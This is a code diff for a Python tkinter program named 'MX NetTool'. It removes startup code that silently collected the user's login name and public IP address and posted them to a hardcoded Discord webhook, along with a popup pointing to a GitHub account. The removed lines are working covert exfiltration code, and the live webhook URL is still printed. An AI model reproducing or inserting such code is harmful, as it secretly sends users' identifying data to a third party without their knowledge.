@@ -1,14 +1,5 @@
 import subprocess
 import sys
-import os
-import requests
-import getpass
-import time
-import random
-import re
-import threading
-import tkinter as tk
-from tkinter import messagebox, scrolledtext
 
 # moduler
 required_modules = ['art', 'tkinter', 're', 'os', 'time', 'random', 'subprocess']
@@ -31,24 +22,14 @@ check_and_install_modules()
 
 # programmet
 import art
-print("github.com/laladaban33")
-
-def get_ip():
-    try:
-        response = requests.get("https://api64.ipify.org?format=json")
-        return response.json().get("ip", "Unknown IP")
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to retrieve IP: {e}")
-        return "Unknown IP"
-
-def send_to_webhook(username):
-    webhook_url = "https://discord.com/api/webhooks/1344774284827955251/6pWu8k00oHBuDayN89FkamuG4a4jsrSm2BkmQ_NmRgCZFBwbBlQG52j4RyZA-_vZcWlK"
-    ip_address = get_ip()
-    data = {"content": f"Username: {username} | IP: {ip_address}"}
-    try:
-        requests.post(webhook_url, json=data)
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to send to webhook: {e}")
+import os
+import subprocess
+import threading
+import tkinter as tk
+from tkinter import messagebox, scrolledtext
+import random
+import time
+import re
 
 def display_ascii_art():
     ascii_banner = art.text2art("MX NetTool", font="small")
@@ -129,13 +110,6 @@ root = tk.Tk()
 root.title("MX NetTool")
 root.geometry("600x400")
 root.configure(bg="black")
-
-# Add the popup message
-messagebox.showinfo("Script Update Notice", "Contact me at github.com/laladaban33 if the script isn't working, since it was recently updated.")
-
-# Send user information to the webhook
-username = getpass.getuser()
-send_to_webhook(username)
 
 # namn
 title_label = tk.Label(root, text="MX NetTool", font=("Courier", 20, "bold"), fg="green", bg="black")
